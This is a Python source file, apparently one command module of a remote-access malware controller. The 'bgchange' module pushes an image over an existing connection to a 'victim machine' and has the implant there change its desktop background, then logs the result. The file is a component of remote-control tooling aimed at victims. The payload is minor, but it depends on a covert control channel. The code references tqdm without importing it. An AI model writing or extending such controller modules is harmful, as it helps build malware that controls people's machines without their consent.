from lib.debug import Debug
from lib.helper import getTime, SUCCESS_CODE, ERROR_CODE
import os
import time

class module():
    def __init__(self):
        self.Command        = "bgchange"
        self.Name           = "Background Changer"
        self.Description    = """This command changes the background of the victim machine"""
        self.Platform       = "multi"

    def _exec(self, dmos, image_path):
        dmos.conn.send(self.Command.encode())
        time.sleep(1)
        _, imageName = os.path.split(image_path)
        cmdstr = os.path.getsize(image_path)
        args = {
            "size": cmdstr,
            "name": imageName
        }
        dmos.wrap_send(args)
        progress = tqdm.tqdm(range(cmdstr), f"Sending {image_path}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(image_path, 'rb') as f:
            while data := f.read(1024):
                if not data:

                    break
                dmos.conn.send(data)
                progress.update(len(data))

                #progress.update(len(data))
        progress.close()
        f.close()
        Debug.tprint(f"Image {image_path} ({cmdstr}) sent to DMOS {dmos.md5_hash}")
        status_code = dmos.conn.recv(64).decode()
        if SUCCESS_CODE in status_code:
            Debug.tprint(f"Background image of DMOS {dmos.md5_hash} changed to {image_path}")
        else:
            Debug.tprint("something went wrong...")
